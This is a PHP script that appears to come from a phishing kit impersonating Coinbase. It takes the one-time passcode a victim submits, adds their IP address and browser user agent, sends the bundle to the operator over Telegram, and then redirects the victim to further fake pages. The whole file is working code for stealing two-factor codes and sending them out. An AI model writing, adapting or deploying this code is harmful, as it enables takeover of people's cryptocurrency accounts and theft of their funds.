 
<?php

include 'settings.php';
$ai = $_POST['token'];


if ($ai != null  )
{

   


        $ip = getenv("REMOTE_ADDR");
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "|----------| COINBASE OTP |--------------|\n";
        $message .= "otp    : " . $ai . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "|-----------  --------------|\n";
        $subject = "COINBASE OTP : $ai";
       

telegram_send(urlencode($message));    

        if ($cvv=="on") {
        	header("Location: ../bill");
        }else{
        	header("Location: ../complete");
        }
    

}

?>
